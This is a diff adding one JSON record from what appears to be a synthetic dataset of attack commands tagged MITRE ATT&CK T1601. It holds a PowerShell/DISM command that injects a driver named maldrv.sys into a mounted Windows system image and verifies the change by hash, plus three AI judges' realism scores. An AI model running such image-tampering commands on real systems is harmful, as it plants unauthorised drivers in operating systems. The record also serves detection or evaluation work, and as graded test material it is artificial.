@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "dism /Mount-Image /ImageFile:C:\\images\\install_clean.wim /Index:1 /MountDir:C:\\Mount\\Base; dism /Mount-Image /ImageFile:C:\\images\\install_mod.wim /Index:1 /MountDir:C:\\Mount\\Win; Copy-Item -Path C:\\staging\\maldrv.sys -Destination C:\\Mount\\Win\\Windows\\System32\\drivers\\maldrv.sys -Force; $b=(Get-FileHash C:\\Mount\\Base\\Windows\\System32\\drivers\\maldrv.sys -Algorithm SHA256 -ErrorAction SilentlyContinue).Hash; $m=(Get-FileHash C:\\Mount\\Win\\Windows\\System32\\drivers\\maldrv.sys -Algorithm SHA256 -ErrorAction SilentlyContinue).Hash; Compare-Object @($b) @($m)",
+  "explanation": "Injects a driver into the offline system image and compares SHA256 hashes versus the clean baseline to validate the unauthorized addition.",
+  "rationale_steps": [
+    "Mount both baseline and target images with DISM (requires Administrator).",
+    "Copy a driver into the modified image's drivers directory.",
+    "Compute and Compare-Object the file hashes to confirm divergence."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1601-f5c24626-8b34eb6a",
+  "source_prompt_hash": "f5c24626",
+  "timestamp_utc": "2025-09-30T04:51:19.633456Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command chain is well-formed with valid DISM flags, proper semicolon separators, and balanced expressions.",
+        "semantic_score": 3,
+        "semantic_justification": "It mounts WIMs and copies a driver into the mounted image and compares results, but omits committing changes back to the image and incorrectly claims no privileges are needed, reducing operational realism for T1601.",
+        "combined_score": 4.0,
+        "confidence": 0.78,
+        "timestamp": "2025-10-02T18:28:34.090861Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is well-formed PowerShell with valid DISM flags, proper Copy-Item syntax, and balanced parentheses/quotes, though mixing semicolons between DISM CLI commands and PowerShell cmdlets in a single pipeline may cause minor execution issues depending on shell context.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1601 by mounting a clean and modified WIM image offline, injecting a malicious driver (maldrv.sys) into the modified image, and then performing SHA256 hash comparison against the clean baseline to verify the unauthorized modification was applied — directly matching the technique's description of tampering with system images and validating changes.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2026-02-19T01:18:49.465631Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses proper PowerShell syntax, valid DISM flags, balanced parentheses, and correct command separators.",
+        "semantic_score": 4,
+        "semantic_justification": "The command logically executes the modification of a system image as described, though it lacks a commit/unmount step to finalize the changes to the WIM file and incorrectly claims to require no privileges despite DISM needing administrative rights.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-19T01:18:55.257344Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
